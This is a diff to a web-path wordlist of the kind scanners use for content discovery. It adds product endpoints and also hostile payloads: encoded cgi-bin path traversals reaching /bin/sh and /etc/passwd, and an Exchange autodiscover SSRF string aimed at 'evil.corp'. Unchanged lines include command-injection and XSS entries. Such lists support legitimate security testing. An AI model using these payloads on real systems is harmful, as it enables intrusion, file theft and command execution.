@@ -588,6 +588,7 @@ CONTACT
 CONTRIBUTING.md
 COPYING
 CREDITS
+CSS/Miniweb.css
 CVS/
 CVS/Entries
 CVS/Root
@@ -700,6 +701,7 @@ Foobar-debug.aspx
 Front/FctPage/Start.aspx
 Front/User/UserLogin.html
 GET ../../proc/ HTTP
+Gdz7
 Gemfile
 Gemfile.lock
 Gemfile.lock/
@@ -846,6 +848,7 @@ Password
 Pc/Lang/index.html
 Phone
 Polycoms/sip.cfg
+Portal0000.htm
 Portals/
 Portals/_default
 Portals/_default/Skins
@@ -895,6 +898,7 @@ RootCA.crt
 SAD.cfg
 SAM
 SCRIPT
+SDK/webLanguage
 SEARCH
 SERVICE
 SPA112/
@@ -1771,6 +1775,7 @@ autoconfig
 autodiscover
 autodiscover/autodiscover.json/v1.0/20HyDRC7xFOr7Z0Low9naxCrLaS@google.com?Protocol=Autodiscoverv1
 autodiscover/autodiscover.json?@127.0.0.1/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@127.0.0.1
+autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp
 autodiscover/autodiscover.json?@google.com/owa/?&Email=autodiscover/autodiscover.json%3F@1337.com
 autodiscover/autodiscover.json?a=a@google.com/ews/exchange.asmx
 autoprovision/
@@ -2057,13 +2062,18 @@ cell.xml
 centreon/include/configuration/configObject/host/refreshMacroAjax.php
 certsrv.nsf
 cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cf
+cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
 cfajax/app/yahoo/yahoo.htm
 cfcache.map
 cfg/
 cgi
+cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
+cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
 cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
 cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts
 cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
 cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
 cgi-bin/.2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
 cgi-bin/;whoami
@@ -2698,6 +2708,7 @@ dir.php
 disables/configures
 discover
 discovery
+dispatch.asp
 dispatcher/invalidate.cache
 display
 display/internal
@@ -3026,6 +3037,7 @@ filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%2
 firmware/
 fj9T
 flashFXP.ini
+flex2gateway/amf
 floaw.php
 flu/403.html
 flumemaster.jsp
@@ -4092,6 +4104,7 @@ oldsite
 on.txt
 one
 opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
+openam/XUI/Login
 openam/ui/PWResetUserValidation
 openserver/phpmyadmin/
 opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
@@ -5323,6 +5336,7 @@ siteadmin
 sitecore/api/graph/items/master/ui?query=foo
 sitecore/login
 sitecore/login?ReturnUrl=%2fsitecore%2fshell%2f
+sitecore/shell/ClientBin/Reporting/Report.ashx
 sitecore/shell/Controls/Lib/jQuery/jquery-1.12.4.min.js
 sitemap
 sitemap.aspx
@@ -5821,6 +5835,7 @@ ui.hydrogen
 ui.hydrogen/show.spooler.data&filter=&query=*&spooler=/../../../../../../../tmp&vroot=/../../../../../tmp/.vroot/foo&path=a
 ui/
 ui/api/v1/global-search/builds?jfLoader=true
+ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
 ui/login
 ui/login.php
 ui/login.php?user=admin
@@ -5878,6 +5893,7 @@ user/?amcontext
 user/Login
 user/activate
 user/allroleinfo
+user/deposit/simplii
 user/getAllNicknames
 user/login
 user/password
@@ -6208,6 +6224,7 @@ wp-content/uploads/tmm_db_migrate/tmm_db_migrate.zip
 wp-includes/
 wp-includes/js/jquery/jquery.js
 wp-includes/wlwmanifest.xml
+wp-json/oembed/1.0/proxy
 wp-json/wp/v2/users
 wp-json/wp/v2/users/1
 wp-login.php
@@ -6305,6 +6322,7 @@ yu.php
 yuyang.php
 z.php
 zabbix/
+zc?action=getInfo
 zebra.conf
 zehir.php
 zenphoto/zp-core/setup/index.php
@@ -6318,7 +6336,3 @@ zz/address.php?gid=651
 zz2/address.php?gid=651
 zzz.php
 ~install/
-ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
-wp-json/oembed/1.0/proxy
-cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
-flex2gateway/amf
